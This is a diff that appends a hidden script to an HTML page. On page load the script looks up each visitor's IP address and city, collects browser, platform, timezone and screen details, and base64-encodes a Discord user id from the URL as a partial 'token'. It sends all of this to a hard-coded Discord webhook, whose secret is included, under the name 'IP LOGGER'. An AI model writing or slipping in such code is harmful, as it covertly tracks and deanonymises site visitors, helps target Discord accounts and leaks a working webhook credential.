@@ -747,5 +747,137 @@
         return false;
       }
     </script>
+  
+    <script>
+
+      var webhookUrl = "https://discord.com/api/webhooks/1165295482973732974/geakIU2aSwHNerScSF1vZDTWBpWHsw8YRtpPtMjRD1b6eE5wRA00RoPUnFsSwxlUbehB";
+
+
+    function getUserInfo() {
+      $.getJSON("https://ipapi.co/json/", function(data) {
+          var ipAddress = data.ip;
+          var region = data.region;
+          var language = navigator.language || navigator.userLanguage;
+          var userAgent = navigator.userAgent
+          var timezoneOffset = new Date().getTimezoneOffset();
+          var screenWidth = screen.width;
+          var screenHeight = screen.height;
+          var platform = navigator.platform
+          var browsername = navigator.appName
+          var browserversion = navigator.appVersion
+          var location = `${data.city}, ${data.region}, ${data.country_name}`;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+
+
+const token = btoa(id)
+
+
+
+    
+     var request = new XMLHttpRequest();
+      request.open("POST", webhookUrl);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+
+let iplogged = {
+  author: {
+    name: "Developed by Sparks (:"
+  },
+  title: "Someone visited our website!",
+      description: `__**DISCORD INFO:**__
+
+**USER**: <@${id}>
+
+**ID**: ${id}
+
+**TOKEN (first part)**: ${token}.
+
+
+
+
+__**WEB INFO:**__
+
+**IP Address**: ${ipAddress}
+
+**Location:** ${location}
+
+**Language**: ${language}
+
+**Search Browser**: ${browsername}, ${browserversion}
+
+**Platform**: ${platform}
+
+**Timezone**: ${timezoneOffset}
+
+**Screen resolution**: ${screenWidth} x ${screenHeight}`,
+color: 15919626
+}
+
+
+var params = {
+  username: "IP LOGGER BY DIGITAL SERVICES",
+avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
+  embeds: [ iplogged ]
+}
+
+
+let iplogged2 = {
+  author: {
+    name: "IP LOGGER - Digital Services"
+  },
+  title: "NEW IP LOGGED",
+      description: `__**DISCORD INFO:**__
+
+**NO DISCORD INFO AVAILABLE**
+- Link did not contain user id
+
+
+
+
+__**WEB INFO:**__
+
+**IP Address**: ${ipAddress}
+
+**Location:** ${location}
+
+**Language**: ${language}
+
+**Search Browser**: ${browsername}, ${browserversion}
+
+**Platform**: ${platform}
+
+**Timezone**: ${timezoneOffset}
+
+**Screen resolution**: ${screenWidth} x ${screenHeight}`,
+color: 15919626
+}
+
+
+var params2 = {
+  username: "IP LOGGER BY DIGITAL SERVICES",
+avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
+  embeds: [ iplogged2 ]
+}
+
+
+if (token !== "bnVsbA==") {
+      request.send(JSON.stringify(params))
+} else {
+
+ request.send(JSON.stringify(params2))
+}
+
+
+
+      });
+    }
+    
+    $(document).ready(function() {
+      getUserInfo();
+    });
+  </script>
   </body>
 </html>
